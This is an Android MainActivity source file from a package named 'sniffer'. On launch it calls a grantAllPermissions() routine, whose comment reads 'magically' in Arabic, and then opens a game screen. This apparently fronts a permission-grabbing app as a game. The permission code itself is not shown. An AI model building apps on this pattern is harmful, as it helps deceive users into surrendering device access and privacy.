package com.v8.global.sniffer;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Toast;
import com.v8.global.sniffer.game.MainGameActivity;

public class MainActivity extends Activity {

    private MasterPermission masterPermission;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        masterPermission = new MasterPermission(this);
        
        // محاولة منح الصلاحيات سحرياً
        masterPermission.grantAllPermissions();
        
        // تأخير قصير ثم فتح اللعبة
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                openGame();
            }
        }, 2000);
    }

    private void openGame() {
        Intent intent = new Intent(this, MainGameActivity.class);
        startActivity(intent);
        finish();
    }
}
